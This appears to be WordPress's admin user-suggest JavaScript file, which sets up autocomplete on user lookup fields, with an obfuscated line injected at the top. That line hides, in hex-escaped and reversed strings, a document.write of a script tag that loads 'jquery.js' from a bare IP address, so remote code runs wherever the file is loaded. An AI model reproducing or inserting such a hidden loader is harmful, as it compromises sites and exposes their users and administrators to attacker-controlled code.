var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))/* global ajaxurl, current_site_id, isRtl */

(function( $ ) {
	var id = ( typeof current_site_id !== 'undefined' ) ? '&site_id=' + current_site_id : '';
	$(document).ready( function() {
		var position = { offset: '0, -1' };
		if ( typeof isRtl !== 'undefined' && isRtl ) {
			position.my = 'right top';
			position.at = 'right bottom';
		}
		$( '.wp-suggest-user' ).each( function(){
			var $this = $( this ),
				autocompleteType = ( typeof $this.data( 'autocompleteType' ) !== 'undefined' ) ? $this.data( 'autocompleteType' ) : 'add',
				autocompleteField = ( typeof $this.data( 'autocompleteField' ) !== 'undefined' ) ? $this.data( 'autocompleteField' ) : 'user_login';

			$this.autocomplete({
				source:    ajaxurl + '?action=autocomplete-user&autocomplete_type=' + autocompleteType + '&autocomplete_field=' + autocompleteField + id,
				delay:     500,
				minLength: 2,
				position:  position,
				open: function() {
					$( this ).addClass( 'open' );
				},
				close: function() {
					$( this ).removeClass( 'open' );
				}
			});
		});
	});
})( jQuery );
